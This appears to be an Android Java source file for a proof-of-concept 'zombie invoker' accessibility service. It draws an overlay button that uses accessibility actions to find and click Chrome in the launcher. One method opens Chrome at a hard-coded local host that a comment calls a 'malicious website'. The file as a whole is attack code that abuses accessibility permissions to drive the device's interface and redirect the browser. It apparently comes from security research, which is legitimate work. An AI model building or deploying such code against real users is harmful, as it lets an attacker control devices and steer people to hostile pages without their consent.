package com.example.accessibilityzombieinvoker;

import static android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import java.util.List;

public class MyAccessibilityService extends AccessibilityService {

    public AccessibilityEvent currentEvent = null;
    public static String TAG = "ACC_ZOMBIE_INVOKER";
    FrameLayout mLayout;
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    void setLayoutView() {
        // Create an overlay and display the action bar
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        mLayout = new FrameLayout(this);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        lp.format = PixelFormat.TRANSLUCENT;
        lp.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        lp.width = WindowManager.LayoutParams.WRAP_CONTENT;
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        lp.gravity = Gravity.RIGHT;
        LayoutInflater inflater = LayoutInflater.from(this);
        inflater.inflate(R.layout.layout, mLayout);
        wm.addView(mLayout, lp);
    }

    void launchChromeIntent() {
        Toast.makeText(this, "Attempting chrome launch", Toast.LENGTH_SHORT).show();
        // Redirect chrome to malicious website
        String urlString = "http://192.168.1.134:1312";
        Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse(urlString));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setPackage("com.android.chrome");
        try {
            getApplicationContext().startActivity(intent);
        } catch (ActivityNotFoundException ignored) {
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.ICE_CREAM_SANDWICH)
    void launchChromeTouch() {
        Log.i(TAG, "DEBUG: function: launchChromeTouch, currentEvent: " + currentEvent.toString());
        Log.d(TAG, "Instance of service: " + this + " Hash code: " + this.hashCode());
        // Check if the event is the app drawer being opened
        if (currentEvent.getEventType() == TYPE_WINDOW_STATE_CHANGED
                && currentEvent.getPackageName().equals("com.android.launcher3")) {
            // Find the Chrome app in the app drawer
            AccessibilityNodeInfo appDrawerList = getRootInActiveWindow();
            if (appDrawerList != null) {
                List<AccessibilityNodeInfo> apps = appDrawerList.findAccessibilityNodeInfosByText("Chrome");
                if (!apps.isEmpty()) {
                    // Click on the Chrome app to launch it
                    apps.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.R)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.i(TAG, "DEBUG: function: onAccessibilityEvent, event: " + event.toString());
        // set event to it is accessible by button click
        currentEvent = new AccessibilityEvent(event);
        Log.i(TAG, "DEBUG: function: onAccessibilityEvent, currentEvent: " + currentEvent.toString());
        Log.d(TAG, "Instance of service: " + this + " Hash code: " + this.hashCode());
    }

    @Override
    public void onInterrupt() {
        // Do nothing
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    @Override
    protected void onServiceConnected() {
        setLayoutView();
        configureButton();

        // Register what type of events will be listened for by the service
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = TYPE_WINDOW_STATE_CHANGED;
        info.packageNames = new String[]{"com.android.launcher3"};
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }

    private void configureButton() {
        Button powerButton = (Button) mLayout.findViewById(R.id.launchChrome);
        powerButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Log.i(TAG, "DEBUG: function: onClick, currentEvent: " + currentEvent.toString());
                launchChromeTouch();
            }
        });
    }
}